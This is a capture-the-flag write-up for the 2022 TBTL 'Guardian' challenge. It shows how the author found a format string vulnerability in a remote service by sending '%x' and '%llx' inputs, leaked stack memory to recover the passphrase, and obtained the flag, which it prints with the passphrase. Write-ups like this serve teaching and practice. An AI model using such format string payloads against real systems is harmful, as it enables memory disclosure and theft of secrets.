# 2022 TBTL - Guardian

Guardian was a pwn challenge where no attachments were provided (no code, no binary). The server application was pretty simple asking us for a password in order to give us the flag:
```
$ nc 0.cloud.chals.io 18978
                      ,-,-      
                     / / |      
   ,-'             _/ / /       
  (-_          _,-' `Z_/        
   "#:      ,-'_,-.    \  _     
    #'    _(_-'_()\     \" |    
  ,--_,--'                 |    
 /                       L-'\ 
 \,--^---v--v-._        / \ | 
   \_________________,-'    | 
                    \           
                     \         
                                


I am the guardian of the ancient flag...
Tell me the secret passphrase or die: p@ssw0rd


p@ssw0rd is not the correct passphrase, prepare to die!
```

Since there is no binary to analyze and no implementation information known, the only thing that we could try out is a format string vulnerability. The fact that our input is reflected back, there is a pretty good change that `%x` would work, so we try it out:
```
$ nc 0.cloud.chals.io 18978
                      ,-,-      
                     / / |      
   ,-'             _/ / /       
  (-_          _,-' `Z_/        
   "#:      ,-'_,-.    \  _     
    #'    _(_-'_()\     \" |    
  ,--_,--'                 |    
 /                       L-'\ 
 \,--^---v--v-._        / \ | 
   \_________________,-'    | 
                    \           
                     \         
                                


I am the guardian of the ancient flag...
Tell me the secret passphrase or die: %x.%x.%x.%x


f48326a3.f4833780.f45643c0.f4a5a700 is not the correct passphrase, prepare to die!
```

String format vulnerability is confirmed. Since this is most probably an x64 binary, we can have another go at it with `%llx` which would reveal more contiguous memory. The solution code in `solve_2022_tbtl_guardian.py` performs the memory leak and gives us the password:
```
$ python3 c.py
[+] Opening connection to 0.cloud.chals.io on port 18978: Done
b'\n\n7fd3688296a3':b'\x80\xa7\x82h\xd3\x7f':b'\xc0\xb3Uh\xd3\x7f':b'\x00\x17\xa5h\xd3\x7f':b'\x00\x17\xa5h\xd3\x7f':b'1':b'PM \x84\xfd\x7f':b'C0rr3c7_':b'H0r53_B4':b'7t3ry_5t':b'4p1e\x00V':b'.M \x84\xfd\x7f':b'0':b'\xf0\x0b\x84d1V':b' \t\x84d1V':b'\x10N \x84\xfd\x7f':b'\x00\x98\x12b\xe5\x1a\x1e\xf0':b'\xf0\x0b\x84d1V':b'@HHh\xd3\x7f':b'0':b'\x18N \x84\xfd\x7f':b'168a53ca0':b'\x90\n\x84d1V':b'0':b'\xd4\x11\x98?fa\x81\xed':b' \t\x84d1V':b'\x10N \x84\xfd\x7f':b'0':b'0':b'\xd4\x11\xf8\xb2.\xa0\x18\xbe':b'\xd4\x11\x88\xa7\xfexE\xbe':b'0':b'0':b'0':b'(N \x84\xfd\x7f':b'hQ\xa5h\xd3\x7f':b' is not the correct passphrase, prepare to die!':[*] Switching to interactive mode

[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 0.cloud.chals.io port 18978
```

If you look closely at the output:
```
b'C0rr3c7_':b'H0r53_B4':b'7t3ry_5t':b'4p1e\x00V'
C0rr3c7_H0r53_B47t3ry_5t4p1e
```

And that is all that we need to get the flag:
```
$ nc 0.cloud.chals.io 18978
                      ,-,-      
                     / / |      
   ,-'             _/ / /       
  (-_          _,-' `Z_/        
   "#:      ,-'_,-.    \  _     
    #'    _(_-'_()\     \" |    
  ,--_,--'                 |    
 /                       L-'\ 
 \,--^---v--v-._        / \ | 
   \_________________,-'    | 
                    \           
                     \         
                                


I am the guardian of the ancient flag...
Tell me the secret passphrase or die: C0rr3c7_H0r53_B47t3ry_5t4p1e


That is correct!
Here is your flag: TBTL{F0rm47_57r1ng5_C4n_B3_D4ng3r0u5}
```
